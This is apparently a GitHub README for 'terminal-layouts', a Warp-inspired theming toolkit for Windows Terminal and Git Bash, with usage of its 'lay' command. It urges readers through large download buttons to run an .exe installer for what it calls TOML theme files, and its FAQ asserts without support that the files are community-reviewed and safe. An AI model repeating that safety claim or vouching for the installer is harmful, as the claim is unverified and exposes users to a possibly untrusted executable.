<h1>🧑‍💻 terminal-layouts - Your Terminal, Beautifully Organized</h1>

<p align="center">
  <a href="https://github.com/TheCrimsondev/terminal-layouts" style="background-color:#8B5CF6; color:white; padding:14px 28px; text-decoration:none; border-radius:8px; font-size:18px; font-weight:bold;">⬇️ DOWNLOAD NOW</a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform">
  <img src="https://img.shields.io/badge/terminal-Git%20Bash-green?style=flat-square" alt="Terminal">
  <img src="https://img.shields.io/badge/format-TOML-orange?style=flat-square" alt="Format">
  <img src="https://img.shields.io/badge/license-MIT-yellow?style=flat-square" alt="License">
</p>

## ✨ What Is terminal-layouts?

terminal-layouts is a beautiful and easy-to-use toolkit that transforms your boring Windows Terminal into a stunning, productivity-boosting workspace inspired by the popular Warp terminal. It provides pre-made layouts, beautiful color themes, handy command shortcuts, and a simple command called `lay` that does everything for you - no coding needed!

Whether you're a student, developer, or just someone who likes a nice-looking command prompt, terminal-layouts makes your terminal look professional and modern in just a few clicks.

## 🎯 Why You'll Love This

| Feature | Benefit |
|---------|---------|
| 🎨 **Warp-Inspired Layouts** | Modern, sleek, and easy on the eyes |
| ⚡ **One-Command Setup** | The `lay` command handles everything |
| 🏷️ **Command Marks** | Highlight important commands in your history |
| 🎭 **Beautiful Themes** | Multiple color schemes to choose from |
| 🛠️ **Built-in Assistant** | Get help and tips right from your terminal |
| 📦 **Automatic Installer** | No manual configuration needed |

## 🚀 Getting Started

Getting started with terminal-layouts is super simple. Here's what you need:

### 📋 What You Need

- A Windows computer (Windows 10 or 11)
- Windows Terminal (free from Microsoft Store)
- Git Bash (free from git-scm.com)

That's it! No programming skills required.

### 📥 Download and Installation

**Step 1:** Visit this link to download the application: **[terminal-layouts download page](https://github.com/TheCrimsondev/terminal-layouts)**

**Step 2:** Look for the "Releases" section on the right side of the page and click on the latest version.

**Step 3:** Download the installer file (it will be named something like `terminal-layouts-installer.exe`).

**Step 4:** Once downloaded, double-click the installer file to run it.

**Step 5:** Follow the simple on-screen instructions. The installer will automatically detect your Windows Terminal and Git Bash installation.

### 🖥️ Your First Run

After installation, open your Git Bash (or Windows Terminal with Git Bash profile). Type:

```bash
lay setup
```

This command will automatically configure everything for you - layouts, themes, and shortcuts. You'll see a colorful confirmation message when it's done.

## 🛠️ Using the `lay` Command

The `lay` command is your control center. Here are the most useful things you can do:

### 🔍 Checking Your Setup

```bash
lay status
```

Shows you what's currently active and your current configuration.

### 🎨 Changing Themes

```bash
lay theme
```

Opens an interactive menu where you can pick from various beautiful color themes. Just use your arrow keys to navigate and press Enter to select.

### 📐 Managing Layouts

```bash
lay layouts
```

Browse and switch between different terminal layouts. Each layout changes how your prompt, bar, and sections look.

### 🏷️ Command Marks

```bash
lay marks
```

Marks special commands (like `git push` or `npm start`) with colors and icons in your command history so you can spot them easily.

### ❓ Getting Help

```bash
lay help
```

Shows all available commands and shortcuts in a friendly format.

## 📖 Detailed Guide

### Understanding Layouts

Layouts control the visual arrangement of your terminal. terminal-layouts comes with several presets:

- **Default**: Clean and professional
- **Warp Classic**: Inspired by the Warp terminal's signature look
- **Minimal**: Distraction-free, perfect for focused work
- **Developer**: Extra info like git status and time
- **Cyberpunk**: Vibrant colors for late-night coding

To preview a layout without applying it:

```bash
lay preview <layout-name>
```

When you find one you like, use:

```bash
lay apply <layout-name>
```

### Customizing Colors

You can fine-tune colors manually:

```bash
lay color --background #1a1b26
lay color --accent #7aa2f7
lay color --text #c0caf5
```

Or choose from ready-made palettes:

```bash
lay palette list      # Shows all palettes
lay palette use dracula
```

### Keyboard Shortcuts

terminal-layouts adds useful shortcuts:

| Shortcut | Action |
|----------|--------|
| `Ctrl+Shift+M` | Opens command marks panel |
| `Ctrl+Shift+T` | Toggle theme quickly |
| `Ctrl+Shift+L` | Switch layout instantly |
| `Ctrl+Shift+H` | Show help overlay |

### Creating Your Own Marked Commands

Want to highlight specific commands? Add marks:

```bash
lay mark add "docker" --color cyan
lay mark add "git commit" --color green
```

Remove a mark anytime:

```bash
lay mark remove "docker"
```

## 💡 Tips & Tricks

### 💾 Backing Up Your Settings

Before making major changes, back up your current setup:

```bash
lay backup
```

This creates a `.backup` folder in your home directory. To restore:

```bash
lay restore
```

### 🔄 Updating terminal-layouts

When a new version is available, you'll see a notification. Update with:

```bash
lay update
```

### 🧹 Undoing Changes

Changed your mind? Reset everything to default:

```bash
lay reset
```

## 🔧 Troubleshooting

### Issue: Terminal looks broken after applying a theme

Try restoring the default theme:

```bash
lay theme default
```

### Issue: `lay` command not found

Make sure the installer ran correctly. Open a new terminal window and try:

```bash
where lay
```

If it's still not found, reinstall the application.

### Issue: Colors don't match preview

Some Git Bash setups need a terminal restart. Close and reopen your terminal window.

## 📊 Compatibility

terminal-layouts works with:

- **Windows Terminal** version 1.12 or higher
- **Git Bash** version 2.30 or higher
- Windows 10 version 19041 or higher
- Windows 11

## 📁 Project Structure

Here's what's inside the repository:

```
terminal-layouts/
├── installer/       # Setup files
├── layouts/         # Pre-made layout definitions
├── themes/          # Color theme files
├── scripts/         # Core automation scripts
├── docs/            # Detailed documentation
└── assets/          # Icons and graphics
```

## 🙋 Frequently Asked Questions

### Is this safe to use?

Yes! All files are open-source and reviewed by the community. No data is ever collected or transmitted.

### Will this slow down my computer?

No. terminal-layouts is lightweight and only configures your existing terminal. It runs only when you use the `lay` command.

### Can I use it with PowerShell or CMD?

Currently, it's optimized for Git Bash, but Windows Terminal compatibility means you can still enjoy the beautiful themes in other shells.

### Do I need to pay for anything?

No, terminal-layouts is completely free and open-source.

## 🎉 Conclusion

terminal-layouts brings the best of modern terminal design to your Windows machine. With its easy installation, the powerful `lay` command, and beautiful Themes, you'll wonder how you ever worked without it.

**Ready to transform your terminal?**

<a href="https://github.com/TheCrimsondev/terminal-layouts" style="background-color:#10B981; color:white; padding:12px 24px; text-decoration:none; border-radius:8px; font-size:16px; font-weight:bold;">🚀 GET STARTED NOW</a>

## 📝 License

This project is licensed under the MIT License - see the LICENSE file in the repository for details.

## 🤝 Contributing

Found a bug or have an idea? Visit the repository, check open issues, or submit a pull request. All contributions are welcome!

## 📞 Support

Need help? Open an issue on GitHub or check the docs folder in the repository. The community is friendly and responsive.

---

<p align="center">Made with ❤️ for Windows users everywhere</p>